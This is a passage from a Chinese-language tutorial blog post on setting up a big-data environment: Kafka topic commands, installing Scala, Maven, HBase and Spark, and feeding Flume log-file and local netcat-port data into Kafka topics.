topic-demo\n```\n8.消费消息\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo\n--beginning 可选参数,代表从头消费\n```\n9.查看所有topic的信息\n```bash\nkafka-topics.sh --zookeeper localhost: 2181 --describe \n--topic topic-demo 可选参数,表示指定topic\n```\n10.单节点多broker\n\n* 修改配合文件中的id,端口,日志文件夹\n* 启动\n```bash\nkafka-server-start.sh --deamon ./config/server.properties &\nkafka-server-start.sh --deamon ./config/server2.properties &\nkafka-server-start.sh --deamon ./config/server3.properties &\n```\n* 多副本\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1\n```\n\n### 九.安装scala\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# tar -zxvf scala-2.11.0.tgz \nroot@ubuntu:~/software/scala-2.11.0# gedit /root/.bashrc \n```\n```bash\n#SCALA_HOME\nexport SCALA_HOME=/root/software/scala-2.11.0\nexport PATH=$SCALA_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/scala-2.11.0# scala\nWelcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).\nType in expressions to have them evaluated.\nType :help for more information.\n\nscala> \n```\n\n### 十.安装maven\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software# tar -zxvf apache-maven-3.8.5-bin.tar.gz\nroot@ubuntu:~/software# mv apache-maven-3.8.5 maven-3.8.5\nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#MAVEN_HOME\nexport MAVEN_HOME=/root/software/maven-3.8.5\nexport PATH=$MAVEN_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mvn -v\nApache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)\nMaven home: /root/software/maven-3.8.5\nJava version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"5.4.0-100-generic\", arch: \"amd64\", family: \"unix\"\n```\n4.修改jar包存放位置\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mkdir maven-repos\nroot@ubuntu:~/software/maven-3.8.5# gedit conf/settings.xml \n```\n添加一行\n```xml\n<localRepository>/root/software/maven-3.8.5/maven-repos</localRepository>\n```\n\n### 十一.Hbase安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf hbase-1.2.0-bin.tar.gz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#HBASE_HOME\nexport HBASE_HOME=/root/software/hbase-1.2.0\nexport PATH=$HBASE_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.编辑配置文件\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-env.sh\n```\n修改\n```bash\n#export JAVA_HOME=/usr/java/jdk1.6.0/\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n修改\n```bash\n# export HBASE_MANAGES_ZK=true\nexport HBASE_MANAGES_ZK=false\n```\n添加\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-site.xml \n```\n```xml\n<configuration>\n        <property>\n                <name>hbase.cluster.distributed</name>\n        </property>\n        <property>\n                <name>hbase.rootdir</name>\n                <value>hdfs://master:9000/hbase</value>\n        </property>\n        <property>\n                <name>hbase.zookeeper.quorum</name>\n                <value>master</value>\n        </property>\n        <property>\n                <name>hbase.master.info.port</name>\n                <value>60010</value>\n        </property>\n</configuration>\n```\n修改\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit regionservers \n```\n为\n```bash\nmaster\n```\n4.启动hbase\n首先要先启动zeekeeper\n```bash\nroot@master:~/software# zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... STARTED\n```\n```bash\nroot@master:~/software# start-hbase.sh \nstarting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\nmaster: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\n```\n```bash\nroot@master:~/software/hbase-1.2.0/bin# jps\n2992 SecondaryNameNode\n4514 QuorumPeerMain\n3282 NodeManager\n6196 HRegionServer\n3143 ResourceManager\n6026 HMaster\n6330 Jps\n2636 NameNode\n2796 DataNode\n```\n访问\n```url\nhttp://master:60010\n```\n\n6.测试\n```bash\nroot@master:~/software/hbase-1.2.0/bin# hbase shell\n\nhbase(main):001:0> version\n1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016\n```\n\n### 十二.Spark安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#SPARK_HOME\nexport SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7\nexport PATH=$SPARK_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.测试\n```bash\nroot@master:~/software/spark-2.1.1-bin-hadoop2.7# spark-shell --version\nWelcome to\n      ____              __\n     / __/__  ___ _____/ /__\n    _\\ \\/ _ \\/ _ `/ __/  '_/\n   /___/ .__/\\_,_/_/ /_/\\_\\   version 2.1.1\n      /_/\n                        \nUsing Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11\nBranch \nCompiled by user jenkins on 2017-04-25T23:51:10Z\nRevision \nUrl \nType --help for more information.\n\n```\n### 十三.flume对接kafka\n一般flume采集的方式有两种\n1.Exec类型的Source\n可以将命令产生的输出作为源，如：\n```bashh\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt //此处输入命令\n```\n2.Spooling Directory类型的 Source\n将指定的文件加入到“自动搜集 ”目录中。flume会持续监听这个目录，把文件当做source来处理。注意：一旦文件被放到“自动收集”目录中后，便不能修改，如果修改，flume会报错。此外，也不能有重名的文件，如果有，flume也会报错。\n```bash\na1.sources.r1.type = spooldir\na1.sources.r1.spoolDir = /home/work/data\n```\n#### 1.flume采集某日志文件到kafka自定义topic\n1.1 创建flume配置文件 flume-kafka-file.conf\n```bash\n# 定义这个agent中各组件的名字\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt\n \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n1.2 启动zookeeper和kafka\n```bash\n./zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... already running as process 5452.\n```\n```bash\nkafka-server-start.sh ./config/server.properties\n```\n1.3 创建topic\n\ntopic:指定topic name\n\npartitions:指定分区数，这个参数需要根据broker数和数据量决定，正常情况下，每个broker上两个partition最好\n\nreplication-factor:副本数，建议设置为2\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1\n```\n1.4 启动kafka去消费topic\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2\n--from-beginning 可选参数,代表从头消费\n```\n1.5 启动flume\n```bash\n./bin/flume-ng agent -n a1 -c ./conf/ -f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console\n```\n1.6 向日志文件/tmp/log.txt写入一些数据\n```bash\necho '123' >> /tmp/log.txt\n```\n就可以在消费者窗口看到输出\n\n\n\n#### 2.flume采集端口数据到kafka自定义topic\n\n2.1 新建配置文件 flume-kafka-port.conf\n```bash\n#指定agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 55555 \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test2\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n2.2所有操作与上文一致\n略\n\n2.3 向端口发送数据\n```bash\nroot@ubuntu:~# nc localhost 55555\nOK\nls\nOK\nls\nOK\nls\nOK\nls\nOK\nls\n```\n\n在消费者端口可以看到\n```bash\nls\nls\nls\nls\nls\n```","tags":["hadoop","kafka","flume"],"categories":["环境搭建"]}]